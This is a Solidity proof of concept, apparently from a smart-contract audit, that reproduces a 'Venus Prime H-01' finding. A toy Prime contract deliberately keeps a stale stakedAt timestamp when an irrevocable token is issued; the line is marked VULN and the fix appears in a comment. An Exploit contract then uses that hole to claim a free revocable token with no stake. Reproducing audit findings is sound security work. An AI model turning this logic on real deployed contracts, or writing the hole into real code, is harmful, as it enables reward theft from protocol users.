// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/* Venus Prime H-01 (#28832).  Minimal local reduction of the stale-stakedAt
   state machine.  An irrevocable issue leaves a historical staking timestamp
   live; after withdrawal and burn it authorizes a later revocable claim. */
contract Prime {
    struct Token { bool exists; bool isIrrevocable; }
    uint256 public constant STAKING_PERIOD = 90 days;
    uint256 public nowTime = 1;
    mapping(address => uint256) public stake;
    mapping(address => uint256) public stakedAt;
    mapping(address => Token) public tokens;

    function deposit(uint256 amount) external {
        stake[msg.sender] += amount;
        if (stakedAt[msg.sender] == 0) stakedAt[msg.sender] = nowTime;
    }
    function withdrawAll() external { stake[msg.sender] = 0; }
    function elapse(uint256 seconds_) external { nowTime += seconds_; }
    function _mint(bool irrevocable, address user) internal { tokens[user] = Token(true, irrevocable); }
    function _initializeMarkets(address) internal {}

    function issue(bool isIrrevocable, address[] calldata users) external {
        if (isIrrevocable) {
            for (uint256 i; i < users.length; i++) {
                Token storage userToken = tokens[users[i]];
                if (userToken.exists && !userToken.isIrrevocable) {
                    userToken.isIrrevocable = true;
                } else {
                    _mint(true, users[i]); // @> VULN: irrevocable issuance leaves the user's old stakedAt timestamp live
                    _initializeMarkets(users[i]);
                    // FIX: delete stakedAt[users[i]];
                }
            }
        } else {
            for (uint256 i; i < users.length; i++) {
                _mint(false, users[i]);
                _initializeMarkets(users[i]);
                delete stakedAt[users[i]];
            }
        }
    }
    function burn(address user) external { delete tokens[user]; }
    function claim() external {
        require(stakedAt[msg.sender] != 0, "IneligibleToClaim");
        require(nowTime - stakedAt[msg.sender] >= STAKING_PERIOD, "WaitMoreTime");
        stakedAt[msg.sender] = 0;
        _mint(false, msg.sender);
    }
}

contract Exploit {
    Prime public prime;
    uint256 public stakeWhenClaimed;
    constructor() { prime = new Prime(); } // CREATE nonce 1
    function run() external {
        prime.deposit(10_000 ether);
        address[] memory users = new address[](1); users[0] = address(this);
        prime.issue(true, users);
        prime.withdrawAll();
        prime.burn(address(this));
        prime.elapse(100 days);
        prime.claim();
        stakeWhenClaimed = prime.stake(address(this));
        (bool exists, bool irrevocable) = prime.tokens(address(this));
        require(stakeWhenClaimed == 0, "stake remains");
        require(exists && !irrevocable, "free revocable Prime not claimed");
    }
}
